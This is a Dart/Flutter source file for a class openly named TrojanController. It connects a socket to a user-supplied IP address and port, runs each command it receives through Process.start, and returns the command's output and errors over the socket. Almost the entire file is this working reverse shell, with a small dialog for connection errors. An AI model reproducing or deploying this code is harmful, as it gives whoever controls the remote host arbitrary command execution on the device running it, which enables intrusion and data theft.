import 'dart:async';
import 'dart:io';
import 'dart:convert';
import 'dart:typed_data';
import 'package:flutter/material.dart';

class TrojanController {
  TrojanController() {
    outputDisplay.add('');
  }

  final formKey = GlobalKey<FormState>();

  final ValueNotifier<bool> isConected = ValueNotifier<bool>(false);

  final TextEditingController textEditingControllerIp = TextEditingController();
  final TextEditingController textEditingControllerPort =
      TextEditingController();

  final StreamController<String> outputDisplay = StreamController<String>();

  List<String> saidas = [];

  late final Socket socket;

  Future<bool> connectTrojan(BuildContext context) async {
    if (formKey.currentState!.validate()) {
      try {
        final Socket newSocket = await Socket.connect(
            textEditingControllerIp.text,
            int.parse(textEditingControllerPort.text));

        socket = newSocket;
        return true;
      } catch (error, stackTrace) {
        showDialog<void>(
          context: context,
          builder: (BuildContext context) => AlertDialog(
            title: Text(error.toString()),
            content: SingleChildScrollView(
              child: Column(
                children: [
                  Text(
                    stackTrace.toString(),
                  ),
                ],
              ),
            ),
            actions: [
              IconButton(
                onPressed: () {
                  Navigator.of(context).pop();
                },
                icon: const Icon(Icons.close),
              )
            ],
          ),
        );
        return false;
      }
    } else {
      return false;
    }
  }

  void runTrojan() {
    socket.listen(
      (Uint8List data) {
        final List<String> listData =
            String.fromCharCodes(data).trim().split(' ');

        final String command = listData.first;

        listData.removeAt(0);

        Process.start(command, listData).then((Process process) {
          process.stdout.transform(utf8.decoder).listen((String output) {
            outputDisplay.add(output);
            socket.write(output);
            socket.flush();
          });
          process.stderr.transform(utf8.decoder).listen((String error) {
            outputDisplay.add(error);
            socket.write(error);
            socket.flush();
          });
        });
      },
      onError: (error) {
        throw Exception('error in trojan :/');
      },
      onDone: () => socket.destroy(),
    );
  }

  void disposeForm() {
    textEditingControllerIp.dispose();
    textEditingControllerPort.dispose();
    isConected.dispose();
  }

  void disposeSockeAndStream() {
    socket.destroy();
    outputDisplay.close();
    outputDisplay.sink.close();
  }
}
